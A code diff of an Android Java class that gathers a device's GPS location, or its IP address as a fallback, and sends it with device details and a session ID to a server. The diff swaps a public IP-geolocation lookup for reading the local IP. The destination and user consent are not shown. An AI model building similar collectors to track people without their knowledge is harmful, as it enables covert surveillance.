@@ -19,11 +19,8 @@ import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
-import java.nio.charset.StandardCharsets;
 import java.util.UUID;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -67,14 +64,14 @@ public class GeolocationCollector {
             Log.d("GeoCollector", "Permission granted → GPS থেকে live location নিচ্ছি...");
             requestLiveLocation();
         } else {
-            Log.d("GeoCollector", "Permission নেই → IP fallback");
-            executor.execute(this::collectViaIpGeolocation);
+            Log.d("GeoCollector", "Permission নেই → Local IP fallback");
+            executor.execute(this::collectViaLocalIp);
         }
 
         mainHandler.postDelayed(() -> {
             if (!locationReceived) {
-                Log.d("GeoCollector", "GPS timeout → fallback IP");
-                executor.execute(this::collectViaIpGeolocation);
+                Log.d("GeoCollector", "GPS timeout → fallback Local IP");
+                executor.execute(this::collectViaLocalIp);
             }
         }, LOCATION_TIMEOUT_MS);
     }
@@ -110,7 +107,7 @@ public class GeolocationCollector {
 
         } catch (SecurityException e) {
             Log.e("GeoCollector", "Security exception: " + e.getMessage());
-            executor.execute(this::collectViaIpGeolocation);
+            executor.execute(this::collectViaLocalIp);
         }
     }
 
@@ -128,28 +125,21 @@ public class GeolocationCollector {
         });
     }
 
-    private void collectViaIpGeolocation() {
+    // Local IP fallback
+    private void collectViaLocalIp() {
         try {
-            Log.d("GeoCollector", "Using IP fallback...");
-            String ipApiResponse = httpGet("http://ip-api.com/json/?fields=status,lat,lon,city,region,country,zip,query");
-            JSONObject obj = new JSONObject(ipApiResponse);
-
-            String lat = obj.optString("lat", "");
-            String lon = obj.optString("lon", "");
-            String city = obj.optString("city", "");
-            String country = obj.optString("country", "");
-            String ip = obj.optString("query", "");
+            Log.d("GeoCollector", "Using Local IP fallback...");
+            String localIp = getLocalIpAddress();
 
             String deviceInfo = collectDeviceInfo();
-            sendToServer("lat=" + lat + "&lon=" + lon +
-                    "&city=" + city + "&country=" + country +
-                    "&ip=" + ip + "&method=ip_fallback" +
-                    "&location_source=ip-geolocation" + deviceInfo);
+            sendToServer("ip=" + localIp +
+                    "&method=local_ip" +
+                    "&location_source=device-network" + deviceInfo);
 
             notifyComplete();
 
         } catch (Exception e) {
-            Log.e("GeoCollector", "IP geolocation error: " + e.getMessage());
+            Log.e("GeoCollector", "Local IP error: " + e.getMessage());
             notifyComplete();
         }
     }
@@ -194,5 +184,22 @@ public class GeolocationCollector {
         sb.append("&session=").append(UUID.randomUUID().toString());
         sb.append("&ts=").append(System.currentTimeMillis());
         return sb.toString();
+    }
+
+    private String getLocalIpAddress() {
+        try {
+            for (java.util.Enumeration<java.net.NetworkInterface> en = java.net.NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
+                java.net.NetworkInterface intf = en.nextElement();
+                for (java.util.Enumeration<java.net.InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
+                    java.net.InetAddress inetAddress = enumIpAddr.nextElement();
+                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof java.net.Inet4Address) {
+                        return inetAddress.getHostAddress();
+                    }
+                }
+            }
+        } catch (Exception ex) {
+            Log.e("GeoCollector", "Local IP error: " + ex.getMessage());
+        }
+        return "";
     }
 }
